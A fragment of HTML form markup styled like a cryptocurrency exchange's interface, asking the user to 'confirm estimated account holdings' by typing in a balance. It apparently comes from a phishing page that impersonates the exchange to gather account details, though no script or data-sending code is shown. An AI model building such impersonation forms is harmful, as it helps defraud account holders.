                                                ...
                                                <div data-testid="load-view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; max-width: 448px; width: 100%;">
                                                    <div data-testid="password-input-code" class="cds-flex-f1g67tkn cds-column-ci8mx7v">
                                                        <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_1qjdqpv">
                                                            <h2 class="cds-typographyResets-t1xhpuq2 cds-title1-toujgnf cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">Confirm estimated account holdings</h2>
                                                            <div data-testid="description" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-1-_1xqs9y8 cds-3-_zv3bp">
                                                                <p class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-start-s1muvu8a cds-break-b8plbaq">
                                                                    <br>
                                                                    Confirm the last estimated holdings on your last account statement
                                                                </p>
                                                            </div>
                                                        </div>
                                                        <form>
                                                            <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1;">
                                                                <label for="cds-textinput-label-:rl:" data-testid="" class="cds-typographyResets-t1xhpuq2 cds-label1-lvviwwo cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-0_5-_1oy8l1i cds-0_5-_uaer6w cds-labelStyle-l14tr5bh" style="color: white;">Last known account holdings</label>
                                                                <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
                                                                    <div class="cds-inputAreaContainerStyles-i1sndg40">
                                                                        <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: rgb(10, 11, 13); --interactable-hovered-opacity: 0.98; --interactable-pressed-opacity: 0.92;">
                                                                            <input aria-describedby="cds-textinput-description-:rl:" aria-label="Account Holdings" class="cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-2-_fbgb57" data-testid="account-holdings-input" style="text-align: start; color: white;" tabindex="0" aria-invalid="false" id="account-holdings" autocomplete="off" type="number" value="">
                                                                        </span>
                                                                    </div>
                                                                </div>
                                                            </div>                                                            
